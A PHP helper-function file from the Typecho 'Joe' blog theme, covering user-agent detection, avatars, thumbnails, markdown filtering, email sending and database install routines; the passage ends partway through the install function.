<?php

namespace joe;

use think\facade\Db;

if (!defined('__TYPECHO_ROOT_DIR__')) {
	http_response_code(404);
	exit;
}

function comment_author($comment)
{
	if (preg_match('/^https?:\/\/[^\s]*/i', $comment->url)) {
		$url = \Typecho\Common::safeUrl($comment->url);
		$domain = parse_url($url, PHP_URL_HOST);
		if ($domain == JOE_DOMAIN) {
			return '<a href="' . $url . '" rel="nofollow">' . $comment->author . '</a>';
		}
		if (\Helper::options()->JPostLinkRedirect == 'on') {
			$url = \Helper::options()->index . '/goto?url=' . base64_encode($url);
			$url = \joe\root_relative_link($url);
		}
		return '<a href="' . $url . '" target="_blank" rel="external nofollow">' . $comment->author . '</a>';
	}
	return $comment->author;
}

/**
 * 获取去掉网站协议和域名的绝对相对路径
 */
function root_relative_link($link)
{
	return str_starts_replace(\Helper::options()->siteUrl, '/', $link);
}

function header_cache($time)
{
	// 设置缓存控制头部
	header("Cache-Control: max-age=$time, public");
	header('Expires: ' . gmdate('D, d M Y H:i:s', time() + $time) . ' GMT');
	header('Pragma: ' . 'cache');
}

/* 判断是否是手机 */
function isMobile()
{
	if (isset($_SERVER['HTTP_X_WAP_PROFILE']))
		return true;
	if (isset($_SERVER['HTTP_VIA'])) {
		return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
	}
	if (isset($_SERVER['HTTP_USER_AGENT'])) {
		$clientkeywords = array('nokia', 'sony', 'ericsson', 'mot', 'samsung', 'htc', 'sgh', 'lg', 'sharp', 'sie-', 'philips', 'panasonic', 'alcatel', 'lenovo', 'iphone', 'ipod', 'blackberry', 'meizu', 'android', 'netfront', 'symbian', 'ucweb', 'windowsce', 'palm', 'operamini', 'operamobi', 'openwave', 'nexusone', 'cldc', 'midp', 'wap', 'mobile');
		if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT'])))
			return true;
	}
	if (isset($_SERVER['HTTP_ACCEPT'])) {
		if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
			return true;
		}
	}
	return false;
}

function isPc()
{
	return !isMobile();
}

/* 根据评论agent获取浏览器类型 */
function getAgentBrowser($agent)
{
	if (preg_match('/MSIE\s([^\s|;]+)/i', $agent, $regs)) {
		$outputer = 'Internet Explore';
	} else if (preg_match('/FireFox\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'FireFox';
	} else if (preg_match('/Maxthon([\d]*)\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'MicroSoft Edge';
	} else if (preg_match('#360([a-zA-Z0-9.]+)#i', $agent, $regs)) {
		$outputer = '360 Fast Browser';
	} else if (preg_match('/Edge([\d]*)\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'MicroSoft Edge';
	} else if (preg_match('/UC/i', $agent)) {
		$outputer = 'UC Browser';
	} else if (preg_match('/QQ/i', $agent, $regs) || preg_match('/QQ Browser\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'QQ Browser';
	} else if (preg_match('/UBrowser/i', $agent, $regs)) {
		$outputer = 'UC Browser';
	} else if (preg_match('/Opera[\s|\/]([^\s]+)/i', $agent, $regs)) {
		$outputer = 'Opera';
	} else if (preg_match('/Chrome([\d]*)\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'Google Chrome';
	} else if (preg_match('/safari\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'Safari';
	} else {
		$outputer = 'Google Chrome';
	}
	return $outputer;
}

function getAgentBrowserIcon($AgentBrowser)
{
	$browser_svg = str_replace(' ', '-', $AgentBrowser);
	if (file_exists(JOE_ROOT . 'assets/images/agent/' . $browser_svg . '.svg')) {
		$browser_url =  \joe\theme_url('assets/images/agent/' . $browser_svg . '.svg', false);
	} else {
		$browser_url =  \joe\theme_url('assets/images/agent/' . $browser_svg . '.png', false);
	}
	return $browser_url;
}

/* 根据评论agent获取设备类型 */
function getAgentOSIcon($agent)
{
	$os = "Linux";
	if (preg_match('/win/i', $agent)) {
		if (preg_match('/nt 6.0/i', $agent)) {
			$os = 'Windows-7';
		} else if (preg_match('/nt 6.1/i', $agent)) {
			$os = 'Windows-7';
		} else if (preg_match('/nt 6.2/i', $agent)) {
			$os = 'Windows-8';
		} else if (preg_match('/nt 6.3/i', $agent)) {
			$os = 'Windows-8';
		} else if (preg_match('/nt 5.1/i', $agent)) {
			$os = 'Windows-XP';
		} else if (preg_match('/nt 10.0/i', $agent)) {
			$os = 'Windows-10';
		} else {
			$os = 'Windows-7';
		}
	} else if (preg_match('/android/i', $agent)) {
		$os = 'Android';
	} else if (preg_match('/ubuntu/i', $agent)) {
		$os = 'Ubuntu';
	} else if (preg_match('/linux/i', $agent)) {
		$os = 'Linux';
	} else if (preg_match('/iPhone/i', $agent)) {
		$os = 'iPhone';
	} else if (preg_match('/mac/i', $agent)) {
		$os = 'MacOS';
	} else if (preg_match('/fusion/i', $agent)) {
		$os = 'Android';
	} else {
		$os = 'Linux';
	}
	return $os;
}

/* 根据评论agent获取设备类型 */
function getAgentOS($agent)
{
	$os = "Linux";
	if (preg_match('/win/i', $agent)) {
		if (preg_match('/nt 6.0/i', $agent)) {
			$os = 'Windows Vista';
		} else if (preg_match('/nt 6.1/i', $agent)) {
			$os = 'Windows 7';
		} else if (preg_match('/nt 6.2/i', $agent)) {
			$os = 'Windows 8';
		} else if (preg_match('/nt 6.3/i', $agent)) {
			$os = 'Windows 8.1';
		} else if (preg_match('/nt 5.1/i', $agent)) {
			$os = 'Windows XP';
		} else if (preg_match('/nt 10.0/i', $agent)) {
			$os = 'Windows 10';
		} else {
			$os = 'Windows X64';
		}
	} else if (preg_match('/android/i', $agent)) {
		if (preg_match('/android 9/i', $agent)) {
			$os = 'Android Pie';
		} else if (preg_match('/android 8/i', $agent)) {
			$os = 'Android Oreo';
		} else {
			$os = 'Android';
		}
	} else if (preg_match('/ubuntu/i', $agent)) {
		$os = 'Ubuntu';
	} else if (preg_match('/linux/i', $agent)) {
		$os = 'Linux';
	} else if (preg_match('/iPhone/i', $agent)) {
		$os = 'iPhone';
	} else if (preg_match('/mac/i', $agent)) {
		$os = 'MacOS';
	} else if (preg_match('/fusion/i', $agent)) {
		$os = 'Android';
	} else {
		$os = 'Linux';
	}
	return $os;
}

/* 获取全局懒加载图 */
function getLazyload()
{
	$JLazyload = empty(\Helper::options()->JLazyload) ? theme_url('assets/images/lazyload.gif', null) : \Helper::options()->JLazyload;
	return $JLazyload;
}

/**
 * 获取头像懒加载图
 */
function getAvatarLazyload()
{
	$str = theme_url('assets/images/avatar-default.png', null);
	return $str;
}

/* 查询文章浏览量 */
function getViews($item)
{
	$result = Db::name('contents')->where('cid', $item->cid)->value('views');
	return number_format($result);
}

/* 查询文章点赞量 */
function getAgree($item)
{
	$result = Db::name('contents')->where('cid', $item->cid)->value('agree');
	return number_format($result);
}

/* 通过邮箱生成头像地址 */
function getAvatarByMail($mail, $type = true)
{
	if (empty($mail)) {
		$mail = Db::name('users')->where('uid', 1)->value('mail');
	}
	$gravatarsUrl = \Helper::options()->JCustomAvatarSource ? \Helper::options()->JCustomAvatarSource : 'https://gravatar.helingqi.com/wavatar/';
	$mailLower = strtolower($mail);
	$md5MailLower = md5($mailLower);
	$qqMail = str_replace('@qq.com', '', $mailLower);
	if (strstr($mailLower, "qq.com") && is_numeric($qqMail) && strlen($qqMail) < 13 && strlen($qqMail) > 4) {
		'https://q4.qlogo.cn/headimg_dl?dst_uin=2136118039&spec=640';
		$result =  'https://thirdqq.qlogo.cn/g?b=qq&nk=' . $qqMail . '&s=640';
	} else {
		$result = $gravatarsUrl . $md5MailLower . '?d=mm';
	}
	if ($type) echo $result;
	return $result;
};

/* 获取侧边栏随机一言 */
function getMotto()
{
	$Motto = isset(\Helper::options()->JMotto) ? \Helper::options()->JMotto : '';
	$JMottoRandom = explode("\r\n", $Motto);
	echo $JMottoRandom[array_rand($JMottoRandom, 1)];
}

/* 获取文章摘要 */
function getAbstract($item, $type = true)
{
	if ($item->fields->abstract) {
		$abstract = $item->fields->abstract;
	} else {
		$abstract = post_description($item, null);
	}
	if (empty($abstract)) {
		$abstract = "暂无简介";
	}
	if ($type) echo $abstract;
	else return $abstract;
}

/* 获取列表缩略图 */
function getThumbnails($item)
{
	$result = [];
	$pattern = '/\<img.*?src\=\"(.*?)\"[^>]*>/i';
	$patternMD = '/\!\[.*?\]\((http(s)?:\/\/.*?(jpg|jpeg|gif|png|webp))/i';
	$patternMDfoot = '/\[.*?\]:\s*(http(s)?:\/\/.*?(jpg|jpeg|gif|png|webp))/i';
	/* 如果填写了自定义缩略图，则优先显示填写的缩略图 */
	if ($item->fields->thumb) {
		$fields_thumb_arr = explode('||', $item->fields->thumb);
		foreach ($fields_thumb_arr as $list) $result[] = $list;
	}
	if (!is_string($item->content)) $item->content = '';
	/* 如果匹配到正则，则继续补充匹配到的图片 */
	if (preg_match_all($pattern, $item->content, $thumbUrl)) {
		foreach ($thumbUrl[1] as $list) $result[] = $list;
	}
	if (preg_match_all($patternMD, $item->content, $thumbUrl)) {
		foreach ($thumbUrl[1] as $list) $result[] = $list;
	}
	if (preg_match_all($patternMDfoot, $item->content, $thumbUrl)) {
		foreach ($thumbUrl[1] as $list) $result[] = $list;
	}
	/* 如果上面的数量不足3个，则直接补充3个随即图进去 */
	if (sizeof($result) < 3) {
		$custom_thumbnail = \Helper::options()->JThumbnail;
		/* 将for循环放里面，减少一次if判断 */
		if ($custom_thumbnail) {
			$custom_thumbnail_arr = explode("\r\n", $custom_thumbnail);
			for ($i = 0; $i < 3; $i++) {
				$result[] = $custom_thumbnail_arr[array_rand($custom_thumbnail_arr, 1)] . "?key=" . mt_rand(0, 1000000);
			}
		} else {
			for ($i = 0; $i < 3; $i++) {
				// 生成一个在 1 到 42 之间的随机数
				$randomNumber = rand(1, 42);
				// 将随机数格式化为两位数
				$formattedNumber = sprintf('%02d', $randomNumber);
				$result[] = theme_url('assets/images/thumb/' . $formattedNumber . '.jpg', null);
			}
		}
	}
	return array_map('trim', $result);
}

/* 获取父级评论 */
function getParentReply($parent)
{
	if ($parent != '0') {
		$author = Db::name('comments')->where('coid', $parent)->value('author');
		if (empty($author)) return;
		echo '<p class="parent">@' . $author . '</p> ';
	}
}

/* 获取侧边栏作者随机文章 */
function getAsideAuthorNav()
{
	if (empty(\Helper::options()->JAside_Author_Nav) || \Helper::options()->JAside_Author_Nav == "off") return;
	$limit = \Helper::options()->JAside_Author_Nav;
	$db = \Typecho\Db::get();
	$prefix = $db->getPrefix();
	$sql = "SELECT * FROM `{$prefix}contents` WHERE cid >= (SELECT floor( RAND() * ((SELECT MAX(cid) FROM `{$prefix}contents`)-(SELECT MIN(cid) FROM `{$prefix}contents`)) + (SELECT MIN(cid) FROM `{$prefix}contents`))) and type='post' and status='publish' and (password is NULL or password='') ORDER BY cid LIMIT $limit";
	$result = $db->query($sql);
	if (!$result instanceof \Traversable) return;
	foreach ($result as $item) {
		$item = \Typecho\Widget::widget('Widget_Abstract_Contents')->push($item);
		$title = htmlspecialchars($item['title']);
		$permalink = \joe\root_relative_link($item['permalink']);
		echo "<li class='item'><a class='link' href='{$permalink}' title='{$title}'>{$title}</a><svg class='svg' aria-hidden='true'><use xlink:href='#icon-copy-color'></use></svg></li>";
	}
}

/* 判断敏感词是否在字符串内 */
function checkSensitiveWords($pregs_string, $string)
{
	$preg_list = explode("||", $pregs_string);
	if (empty($preg_list)) return false;
	foreach ($preg_list as $preg) {
		$preg = trim($preg);
		if (str_starts_with($preg, '/')) return preg_match($preg, $string);
		if (strpos($string, $preg) !== false) return true;
	}
	return false;
}

function theme_url($path, $param = ['version' => 'md5'])
{
	static $url_root = null;
	if (is_null($url_root)) {
		$themeUrl = \Helper::options()->themeUrl;
		$theme_url_parse = parse_url($themeUrl);
		$theme_url_domain = $theme_url_parse['host'] . ($theme_url_parse['port'] ?? '');
		if ($theme_url_domain != $_SERVER['HTTP_HOST']) {
			$themeUrl = str_replace($theme_url_domain, $_SERVER['HTTP_HOST'], $themeUrl);
		}
		$themeUrl = preg_replace("/^http[s]?:\/\//", '//', $themeUrl);
		$url_root = empty(\Helper::options()->JStaticAssetsUrl) ? $themeUrl : \Helper::options()->JStaticAssetsUrl;
		$lastChar = substr($url_root, -1);
		if ($lastChar != '/') $url_root = $url_root . '/';
	}
	$url = $url_root . $path;
	if (isset($param['version']) && $param['version'] == 'md5') {
		$file = JOE_ROOT . $path;
		$param['version'] = is_file($file) ? md5_file($file) : JOE_VERSION;
	}
	return url_builder($url, $param);
}

function url_builder($url, $param = null)
{
	if (is_array($param) && !empty($param)) {
		$param = http_build_query($param);
		$url = strstr($url, '?') ? (trim($url, '&') . '&' . $param) : ($url . '?' . $param);
	}
	return $url;
}

/** 过滤Markdown语法代码 */
function markdown_filter($content): string
{
	if (!is_string($content)) return '';

	// 跑马灯
	$content = str_replace('{lamp/}', ' ', $content);

	// 任务
	$content = str_replace('{ }', ' ', $content);
	$content = str_replace('{x}', ' ', $content);

	// 网易云音乐
	$content = preg_replace('/{music-list([^}]*)\/}/', ' ', $content);
	$content = preg_replace('/{music([^}]*)\/}/', ' ', $content);

	// 音乐标签
	$content = preg_replace('/\{mp3 name\="(.*?)" artist\="(.*?)".*?\/\}/S', '$1 - $2', $content);

	// 哔哩哔哩视频
	$content = preg_replace('/{bilibili([^}]*)\/}/', ' ', $content);

	// 视频
	$content = preg_replace('/{dplayer([^}]*)\/}/', ' ', $content);

	// 居中标题标签
	$content = preg_replace('/\{mtitle title\="(.*?)"\/\}/', '$1', $content);

	// 多彩按钮
	$content = preg_replace('/\{abtn.*?content\="(.*?)"\/\}/', '$1', $content);

	// 云盘下载
	$content = preg_replace('/\{cloud title\="(.*?)" type\="\w+" url\="(.*?)" password\="(.*?)"\/\}/', '$1 下载地址：$2 提取码：$3', $content);

	// 便条按钮
	$content = preg_replace('/\{anote.*?content\="(.*?)"\/\}/', '$1', $content);

	// 彩色虚线
	$content = preg_replace('/{dotted([^}]*)\/}/', ' ', $content);

	// 消息提示
	$content = preg_replace('/\{message type="\w+" content\="(.*?)"\/\}/', '$1', $content);

	// 进度条
	$content = preg_replace('/\{progress percentage="(\d+)" color\="#?([a-fA-F0-9]{6}|[a-fA-F0-9]{3})"\/\}/', '进度$1%', $content);

	// 隐藏内容
	$content = preg_replace('/{hide[^}]*}([\s\S]*?){\/hide}/', '隐藏内容，请前往内页查看详情', $content);

	// 以下为双标签

	// 默认卡片
	$content = preg_replace('/\{card\-default label\="(.*?)" width\="\d+"\}([\s\S]*?)\{\/card\-default\}/', '$1 - $2', $content);

	// 标注
	$content = preg_replace('/\{callout color\="#?([a-fA-F0-9]{6}|[a-fA-F0-9]{3})"\}([\s\S]*?)\{\/callout\}/', '$1', $content);

	// 警告提示
	$content = preg_replace('/\{alert type\="\w+"\}([\s\S]*?)\{\/alert\}/', '$1', $content);

	// 描述卡片
	$content = preg_replace('/\{card\-describe title\="(.*?)"\}([\s\S]*?)\{\/card\-describe\}/', '$1 - $2', $content);

	// 标签页
	$content = preg_replace('/\{tabs\}([\s\S]*?)\{\/tabs\}/', '$1', $content);
	$content = preg_replace('/\{tabs\-pane label\="(.*?)"}([\s\S]*?)\{\/tabs\-pane\}/', '$1 $2', $content);

	// 卡片列表
	$content = preg_replace('/\{card\-list\}([\s\S]*?)\{\/card\-list\}/', '$1', $content);
	$content = preg_replace('/\{card\-list\-item\}([\s\S]*?)\{\/card\-list\-item\}/', '$1', $content);

	// 时间轴
	$content = preg_replace('/\{timeline\}([\s\S]*?)\{\/timeline\}/', '$1', $content);
	$content = preg_replace('/\{timeline\-item color\="#?([a-fA-F0-9]{6}|[a-fA-F0-9]{3})"\}([\s\S]*?)\{\/timeline\-item\}/', '$1', $content);

	// 折叠面板
	$content = preg_replace('/\{collapse\}([\s\S]*?)\{\/collapse\}/', '$1', $content);
	$content = preg_replace('/\{collapse\-item label\="(.*?)"\s?[open]*\}([\s\S]*?)\{\/collapse\-item\}/', '$1 - $2', $content);

	// 宫格
	$content = preg_replace('/\{gird column\="\d+" gap\="\d+"\}([\s\S]*?)\{\/gird\}/', '$1', $content);
	$content = preg_replace('/\{gird\-item\}([\s\S]*?)\{\/gird\-item\}/', '$1', $content);

	// 复制
	$content = preg_replace('/\{copy showText\="(.*?)" copyText\="(.*?)"\/\}/', '$1 $2', $content);

	// 其他开合标签
	// $content = preg_replace('/\{[\w,\-]+.*?\}(.*?)\{\/[\w,\-]+\}/S', '$1', $content);

	// 标签中有content值
	// $content = preg_replace('/\{.*?content\="(.*?)"\/\}/S', '$1', $content);

	// 剩下没有文本的单标签
	// $content = preg_replace('/\{.*?\/\}/S', ' ', $content);

	$content = trim($content);
	return $content;
}

/**
 * 对文章的简短纯文本描述
 *
 * @return string
 */
function post_description($item, ?int $length = 150)
{
	if ($item->password) {
		return "加密文章，请前往内页查看详情";
	} else {
		$content = $item->content;
		$content = html_tags_filter($content, ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p']);
		$content = str_replace(['<br>', '<li>', '</li>'], [' ', '<li> ', '</li> '], $content);
		$content = preg_replace('/\<img src\=".*?" alt\="(.*?)" title\=".*?"\>/', '$1图片', $content);
		$content = str_replace(['图片图片', 'Test图片'], '图片', $content);
		$content = str_replace(["\n", '"'], [' ', '&quot;'], strip_tags(markdown_filter($content)));
		$content = preg_replace('/\s+/s', ' ', $content);
		$content = empty($content) ? $item->title : $content;
		if (is_numeric($length)) $content = trim(\Typecho\Common::subStr($content, 0, $length, '...'));
		return trim($content);
	}
}

function html_tags_filter(string $content, array $tags): string
{
	foreach ($tags as $value) {
		$content = preg_replace('/\<' . $value . '\>(.*?)\<\/' . $value . '\>/i', '$1 ', $content);
	}
	return $content;
}

function user_login($uid, $expire = 30243600)
{
	$db = \Typecho\Db::get();
	\Typecho\Widget::widget('Widget_User')->simpleLogin($uid);
	$authCode = function_exists('openssl_random_pseudo_bytes') ? bin2hex(openssl_random_pseudo_bytes(16)) : sha1(\Typecho_Common::randString(20));
	\Typecho_Cookie::set('__typecho_uid', $uid, time() + $expire);
	\Typecho_Cookie::set('__typecho_authCode', \Typecho_Common::hash($authCode), time() + $expire);
	//更新最后登录时间以及验证码
	$db->query($db->update('table.users')->expression('logged', 'activated')->rows(array('authCode' => $authCode))->where('uid = ?', $uid));
}

function user_url($action, $from = true)
{
	if ($from === true) {
		if (!empty($_GET['referer'])) {
			$url = '?referer=' . urlencode($_GET['referer']);
		} else {
			$sys_protocal = isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://';
			$php_self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
			$path_info = isset($_SERVER['PATH_INFO']) ? $_SERVER['PATH_INFO'] : '';
			$relate_url = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : $php_self . (isset($_SERVER['QUERY_STRING']) ? '?' . $_SERVER['QUERY_STRING'] : $path_info);
			$url = '?referer=' . urlencode($sys_protocal . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . $relate_url);
		}
	} else if (is_string($from)) {
		$url = '?referer=' . urlencode($from);
	} else {
		$url = '';
	}
	switch ($action) {
		case 'register':
			if (\Helper::options()->JUser_Switch == 'on') {
				$url = \Typecho_Common::url('user/register', \Helper::options()->index) . $url;
			} else {
				$url = \Helper::options()->adminUrl . 'register.php';
			}
			break;
		case 'login':
			if (\Helper::options()->JUser_Switch == 'on') {
				$url = \Typecho_Common::url('user/login', \Helper::options()->index) . $url;
			} else {
				$url = \Helper::options()->adminUrl . 'login.php';
			}
			break;
		case 'forget':
			$url = \Typecho_Common::url('user/forget', \Helper::options()->index) . $url;
			break;
	}
	$url = root_relative_link($url);
	return $url;
}


/** 获取百度统计配置 */
function baidu_statistic_config()
{
	$statistics_config = \Helper::options()->baidu_statistics ? explode(PHP_EOL, \Helper::options()->baidu_statistics) : null;
	if (is_array($statistics_config) && count($statistics_config) == 4) {
		return [
			'access_token' => trim($statistics_config[0]),
			'refresh_token' => trim($statistics_config[1]),
			'client_id' => trim($statistics_config[2]),
			'client_secret' => trim($statistics_config[3])
		];
	}
	return null;
}

/** 检测主题设置是否配置邮箱 */
function email_config()
{
	if (!empty(\Helper::options()->JMailApi)) return true;
	if (
		empty(\Helper::options()->JCommentMailHost) ||
		empty(\Helper::options()->JCommentMailPort) ||
		empty(\Helper::options()->JCommentMailAccount) ||
		empty(\Helper::options()->JCommentMailFromName) ||
		empty(\Helper::options()->JCommentSMTPSecure) ||
		empty(\Helper::options()->JCommentMailPassword)
	) {
		return false;
	} else {
		return true;
	}
}

/**
 * 发送电子邮件
 * @return true|string
 */
function send_email($title, $subtitle, $content, $email = '')
{
	if (!email_config()) return false;
	if (empty($email)) {
		$mail = Db::name('users')->where('uid', 1)->value('mail');
		$email = $mail ? $mail : \Helper::options()->JCommentMailAccount;
	}
	if (empty($subtitle)) $subtitle = '';
	$html = '<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport"content="width=device-width, initial-scale=1.0"></head><body><style>.container{width:95%;margin:0 auto;border-radius:8px;font-family:"Helvetica Neue",Helvetica,"PingFang SC","Hiragino Sans GB","Microsoft YaHei","微软雅黑",Arial,sans-serif;box-shadow:0 2px 12px 0 rgba(0,0,0,0.1);word-break:break-all}.title{color:#ffffff;background:linear-gradient(-45deg,rgba(9,69,138,0.2),rgba(68,155,255,0.7),rgba(117,113,251,0.7),rgba(68,155,255,0.7),rgba(9,69,138,0.2));background-size:400% 400%;background-position:50% 100%;padding:15px;font-size:15px;line-height:1.5}</style><div class="container"><div class="title">{title}</div><div style="background: #fff;padding: 20px;font-size: 13px;color: #666;">{subtitle}<div style="padding: 15px;margin-bottom: 20px;line-height: 1.5;background: repeating-linear-gradient(145deg, #f2f6fc, #f2f6fc 15px, #fff 0, #fff 25px);">{content}</div><div style="line-height: 2">请注意：此邮件由系统自动发送，请勿直接回复。<br>若此邮件不是您请求的，请忽略并删除！</div></div></div></body></html>';
	$html = strtr(
		$html,
		array(
			"{title}" => $title . ' - ' . \Helper::options()->title,
			"{subtitle}" => empty($subtitle) ? '' : '<div style="margin-bottom: 20px;line-height: 1.5;">' . $subtitle . '</div>',
			"{content}" => $content,
		)
	);
	$FromName = empty(\Helper::options()->JCommentMailFromName) ? \Helper::options()->title : \Helper::options()->JCommentMailFromName;
	if (!empty(\Helper::options()->JMailApi)) {
		$JMailApi = optionMulti(\Helper::options()->JMailApi, '||', null, ['url', 'title', 'name', 'content', 'email', 'code', '200', 'message']);
		require_once dirname(__DIR__) . '/vendor/autoload.php';
		$send_email = \network\http\post($JMailApi['url'], [
			$JMailApi['title'] => $title,
			$JMailApi['name'] => $FromName,
			$JMailApi['content'] => $html,
			$JMailApi['email'] => $email
		])->toArray();
		if (is_array($send_email)) {
			if ($send_email[$JMailApi['code']] == $JMailApi['200']) {
				return true;
			} else {
				return isset($send_email[$JMailApi['message']]) ? $send_email[$JMailApi['message']] : 'API对接发件失败！失败消息不存在';
			}
		} else {
			return $send_email;
		}
	}
	if (!class_exists('\PHPMailer', false)) {
		require_once JOE_ROOT . 'public/phpmailer.php';
		require_once JOE_ROOT . 'public/smtp.php';
	}
	$mail = new \PHPMailer();
	$mail->isSMTP();
	$mail->SMTPAuth = true;
	$mail->CharSet = 'UTF-8';
	$mail->SMTPSecure = \Helper::options()->JCommentSMTPSecure;
	$mail->Host = \Helper::options()->JCommentMailHost;
	$mail->Port = \Helper::options()->JCommentMailPort;
	$mail->FromName = $FromName;
	$mail->Username = \Helper::options()->JCommentMailAccount;
	$mail->From = \Helper::options()->JCommentMailAccount;
	$mail->Password = \Helper::options()->JCommentMailPassword;
	$mail->isHTML(true);
	$mail->Body = $html;
	$mail->addAddress($email);
	$mail->Subject = $title . ' - ' . \Helper::options()->title;
	return $mail->send() ? true : $mail->ErrorInfo;
}

/**
 * 输出CDN链接
 *
 * @param string|null $path 子路径
 * @return string
 */
function cdn($path = '')
{
	$JCdnUrl = empty(\Helper::options()->JCdnUrl) ? theme_url('assets/plugin/', false) : \Helper::options()->JCdnUrl;
	$JCdnUrl_explode = explode('||', $JCdnUrl, 2);
	$cdnpublic = trim($JCdnUrl_explode[0]); // 获取 || 之前的内容
	if (substr($cdnpublic, -1) != '/') $cdnpublic = $cdnpublic . '/';
	if (!empty($JCdnUrl_explode[1])) {
		$backslash = trim($JCdnUrl_explode[1]); // 获取 || 之后的内容
		$path = preg_replace('/\//', $backslash, $path, 1);
	}
	$url = trim($cdnpublic) . trim($path);
	return $url;
}

/**
 * @param string $haystack 被搜索的字符串
 * @param array $needles 要搜索的字符串
 * @return bool
 */
function strstrs(string $haystack, array $needles): bool
{
	foreach ($needles as $value) {
		if (stristr($haystack, $value) !== false) return true;
	}
	return false;
}

/**
 * 显示上一篇
 *
 * 如果没有下一篇,返回null
 */
function thePrev($widget, $default = NULL)
{
	$content = Db::name('contents')->where('created', '<', $widget->created)
		->where(['status' => 'publish', 'type' => $widget->type])
		->order('created', 'desc')
		->find();
	if ($content) {
		// $content = $widget->filter($content);
		$routeExists = (null != \Typecho\Router::get($content['type']));
		$content['pathinfo'] = $routeExists ? \Typecho\Router::url($content['type'], $content) : '#';
		$content['url'] = $content['permalink'] = \Typecho\Common::url($content['pathinfo'], \Helper::options()->index);
		return $content;
	} else {
		return $default;
	}
}

/**
 * 获取下一篇文章mid
 *
 * 如果没有下一篇,返回null
 */
function theNext($widget, $default = NULL)
{
	$db = \Typecho\Db::get();
	$content = $db->fetchRow($widget->select()->where(
		'table.contents.created > ? AND table.contents.created < ?',
		$widget->created,
		\Helper::options()->time
	)
		->where('table.contents.status = ?', 'publish')
		->where('table.contents.type = ?', $widget->type)
		->where("table.contents.password IS NULL OR table.contents.password = ''")
		->order('table.contents.created', \Typecho\Db::SORT_ASC)
		->limit(1));

	if ($content) {
		$content = $widget->filter($content);
		return $content;
	} else {
		return $default;
	}
}

function dateWord($original_date)
{
	// 2022年08月01日 -> 2022年
	if (preg_match('/(\d+)年\d+月\d+日/i', $original_date, $match)) {
		$original_date = (date('Y') - $match[1]) . '年前';
	}

	// 昨天 21:11 -> 昨天
	$original_date = preg_replace('/昨天 \d+:\d+/i', '昨天', $original_date);

	$original_date = str_replace(['一', '二', '三', '四', '五', '六', '七', '八', '九', '十'], ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10'], $original_date);

	// 10月8日 -> 10月
	// $original_date = preg_replace('/(\d+月)\d+日/i', '$1', $original_date); 

	return $original_date;
}

function optionMulti($string, string $line = "\r\n", $separator = '||', array $key = []): array
{
	if (empty($string) || !is_string($string)) return [];
	$explode_string = explode($line, $string);
	if (is_string($separator)) {
		$optionMulti = [];
		foreach ($explode_string as $index => $value) {
			$option = array_map('trim', explode($separator, $value));
			foreach ($key as $i => $val) {
				$option[$val] = isset($option[$i]) ? $option[$i] : null;
			}
			$optionMulti[$index] = $option;
		}
	} else {
		$optionMulti = array_map('trim', $explode_string);
		foreach ($key as $index => $value) {
			$optionMulti[$value] = isset($optionMulti[$index]) ? $optionMulti[$index] : null;
		}
	}
	// foreach ($customArr as $index => $value) {
	// 	if (is_string($separator)) {
	// 		$option = array_map('trim', explode($separator, $value));
	// 		foreach ($key as $i => $val) {
	// 			$option[$val] = isset($option[$i]) ? $option[$i] : null;
	// 		}
	// 		$optionMulti[$index] = $option;
	// 	} else {
	// 		$optionMulti[$index] = trim($value);
	// 	}
	// 	$option = is_string($separator) ? array_map('trim', explode($separator, $value)) : trim($value);
	// 	foreach ($key as $i => $val) {
	// 		if (is_string($separator)) $option[$val] = isset($option[$i]) ? $option[$i] : null;
	// 	}
	// 	if (!is_string($separator) && isset($key[$index])) {
	// 		$optionMulti[$key[$index]] = $option;
	// 	} else {
	// 		$optionMulti[] = $option;
	// 	}
	// }
	return $optionMulti;
}

/**
 * 检测面板是否存在
 *
 * @param string $fileName 文件名称
 * @return bool
 */
function panel_exists(string $fileName): bool
{
	$panelTable = is_array(\Helper::options()->panelTable) ? \Helper::options()->panelTable : unserialize(\Helper::options()->panelTable);
	$panelTable['file'] = empty($panelTable['file']) ? [] : $panelTable['file'];
	$fileName = urlencode(trim($fileName, '/'));
	return in_array($fileName, $panelTable['file']);
}

function update_sql()
{
	$DB = \Typecho\Db::get();
	$adapter = $DB->getAdapterName();
	$adapter = ltrim($adapter, 'Pdo_');
	if ($adapter == 'Mysqli') $adapter = 'Mysql';
	$version_file = JOE_ROOT . 'install/version';
	$version = file_get_contents($version_file);
	$SQLFile = JOE_ROOT . 'install/' . $adapter . '_' . $version . '.sql';
	if (!file_exists($SQLFile)) return null;
	$SQL = file_get_contents($SQLFile);
	$SQL = str_replace(['prefix_', 'typecho_'], $DB->getPrefix(), $SQL);
	$SQL = explode(';', $SQL);
	try {
		foreach ($SQL as $value) $DB->query($value);
		file_put_contents($version_file, $version + 1);
	} catch (\Exception $e) {
		throw new \Typecho\Exception($e);
	}
}

function install_sql()
{
	$DB = \Typecho\Db::get();
	$adapter = $DB->getAdapterName();
	$adapter = ltrim($adapter, 'Pdo_');
	if ($adapter == 'Mysqli') $adapter = 'Mysql';
	$SQLFile = JOE_ROOT . 'install/' . $adapter . '.sql';
	if (!file_exists($SQLFile)) return '暂不兼容 [' . $adapter . '] 数据库适配器！';
	$SQL = trim(file_get_contents($SQLFile), ';');
	$SQL = str_replace(['prefix_', 'typecho_'], $DB->getPrefix(), $SQL);
